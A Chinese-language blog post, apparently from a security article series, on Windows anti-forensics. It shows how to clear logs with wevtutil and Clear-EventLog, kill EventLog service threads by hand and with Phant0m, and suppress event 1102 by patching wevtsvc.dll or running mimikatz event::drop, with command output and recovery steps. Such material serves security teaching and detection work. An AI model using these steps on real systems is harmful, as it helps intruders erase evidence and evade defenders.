# 【Day 26】我們與 1102 的距離 - Bypass Clear Log Event

## 環境
* Windows 10 1709
* Mimikatz 2.2.0

## 事件日誌
打開事件檢視器（Event Viewer）會看到許多種事件記錄，這些事件記錄檔案預設存放在 `C:\Windows\System32\winevt\Logs`。事件日誌對於藍隊而言是個能夠知道這台機器做了哪些事情，而判斷出紅隊入侵的行為與證據；對於紅隊而言則是希望能夠在滲透時隱藏蹤跡，不被發現。

在安全性（Security）日誌檔，大家可能會注意到例如 4624、4625、4720 等等事件 ID，分別代表[帳戶已成功登入](https://docs.microsoft.com/zh-tw/windows/security/threat-protection/auditing/event-4624)、[帳戶無法登入](https://docs.microsoft.com/zh-tw/windows/security/threat-protection/auditing/event-4625)、[已建立使用者帳戶](https://docs.microsoft.com/zh-tw/windows/security/threat-protection/auditing/event-4720)。這些常見的事件 ID 對鑑識人員來說肯定非常熟悉，其中這篇的主角 [1102 稽核記錄已清除](https://docs.microsoft.com/zh-tw/windows/security/threat-protection/auditing/event-1102)更是家喻戶曉。
![](https://i.imgur.com/qOz9yW0.png)

## 清除事件日誌
一般清除事件日誌的方法很多，這邊舉簡單的三個。

### Event Viewer
在 Event Viewer 的右邊欄位有個清除記錄檔，按下去就刪除了。
![](https://i.imgur.com/mGYc3zX.png)

### wevtutil.exe
除了用來清除日誌之外，還有列舉、查看日誌等等功能。
```
el | enum-logs          List log names.
gl | get-log            Get log configuration information.
sl | set-log            Modify configuration of a log.
ep | enum-publishers    List event publishers.
gp | get-publisher      Get publisher configuration information.
im | install-manifest   Install event publishers and logs from manifest.
um | uninstall-manifest Uninstall event publishers and logs from manifest.
qe | query-events       Query events from a log or log file.
gli | get-log-info      Get log status information.
epl | export-log        Export a log.
al | archive-log        Archive an exported log.
cl | clear-log          Clear a log.
```

假設要刪除安全性日誌，指令如下。
```
# wevtutil.exe cl security
```

### Powershell
在 Powershell 使用 Clear-EventLog 指令也可以清除日誌
```
# Clear-EventLog security
```

## 關閉事件日誌
### 原理
Windows 事件日誌的服務可以對應到 EventLog 服務的 svchost.exe，也就是說只要關閉這個服務，就不會有事件被記錄。可以使用 Powershell 的 Get-WmiObject 指令找出目標 EventLog 服務。 
```
# Get-WmiObject -Class win32_service -Filter "name = 'eventlog'"

ExitCode  : 0
Name      : EventLog
ProcessId : 6832
StartMode : Auto
State     : Running
Status    : OK
```

然後用 Process Explorer 打開這個 Process，按下上面的 Threads，可以看到這個 Process 目前正在跑的 Thread，其中有四個服務名稱是 EventLog，把它們全都 Kill 或 Suspend，就成功停止事件記錄了。
![](https://i.imgur.com/blbVpvj.png)

### 復原方法
1. 用 Process Explorer 關閉那個 Process
2. 在 cmd 打 `net start eventlog` 重啟服務

### 工具
開源工具 [Phant0m](https://github.com/hlldz/Phant0m)，編譯之後執行就會把 EventLog 服務對應的 Thread 關閉。
```
# phant0m-exe.exe                                         
         ___ _  _   _   _  _ _____ __  __  __             
        | _ \ || | /_\ | \| |_   _/  \|  \/  |            
        |  _/ __ |/ _ \| .` | | || () | |\/| |            
        |_| |_||_/_/ \_\_|\_| |_| \__/|_|  |_|            
                                                          
        Version:        2.0                               
        Author:         Halil Dalabasmaz                  
        WWW:            artofpwn.com                      
        Twitter:        @hlldz                            
        Github:         @hlldz                            
                                                          
[+] Process Integrity Level is high, continuing...        
                                                          
[!] SeDebugPrivilege is not enabled, trying to enable...  
[+] SeDebugPrivilege is enabled, continuing...            
                                                          
[*] Attempting to detect PID from Service Manager...      
[+] Event Log service PID detected as 6768.               
                                                          
[*] Using Technique-1 for killing threads...              
[+] Thread 752 is detected and successfully killed.       
[+] Thread 5068 is detected and successfully killed.      
[+] Thread 5224 is detected and successfully killed.      
[+] Thread 6680 is detected and successfully killed.      
                                                          
[*] All done.                                             
```

## 刪除 1102 事件
### 動機
雖然成功關閉了 EventLog 服務，但是大家會發現如果在機器上清除日誌，1102 事件仍然會存在，就算再清除一次還是會更新。
![](https://i.imgur.com/kA2JMpb.png)

所以要找到方法刪掉這個事件，得要知道這個事件是如何產生的。
從 EventLog 的設定 Registry `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog` 可以發現，其中使用了 wevtsvc.dll。因此可以分析 wevtsvc.dll 來確認 1102 事件的出現原因。
![](https://i.imgur.com/bbE0lXR.png)

### 原理
分析 Wevtsvc.dll 可以發現，在 `Channel::ClearChannelLog` 函數，這個函數就是負責處理 1102 事件的函數。其中又呼叫了 `Channel::FireEventIntoLog` 函數。
![](https://i.imgur.com/5iRdFJg.png)

直接拿 x64dbg 跑，Patch `Channel::FireEventIntoLog`，就會發現不會再產生 1102 事件了。除了 `Channel::FireEventIntoLog` 函數外，其實還可以 Patch `Channel::ActualProcessEvent`、`File::ActualWriteRecord`、`File::WriteOneEventToBuffer`、`FilterChannel::Indicate`、`FilterChannel::ForwardToClients`、`FilterConsumer::ForwardToClient` 等等都可以達到同個效果。

這時再清除一次日誌，就會發現日誌清潔溜溜了。
![](https://i.imgur.com/6FXE6TR.png)

### 工具
[Mimikatz](https://github.com/ParrotSec/mimikatz) 也有實作這個功能，原理是先透過 Pattern 找到 `Channel::ActualProcessEvent` 函數，並且把  `Channel::ActualProcessEvent` 的第一個 Byte 改寫成 `ret`，機械碼為 `c3`。以下為使用方法。
```
# mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec  3 2020 12:23:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # PRIVILEGE::Debug
Privilege '20' OK

mimikatz # event::drop
"EventLog" service patched
```

## 參考資料
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [渗透技巧——Windows日志的删除与绕过](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87)
* [Phant0m](https://github.com/hlldz/Phant0m)
* [Event Log Tampering Part 1: Disrupting the EventLog Service](https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c)
* [Windows Security Log Events](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
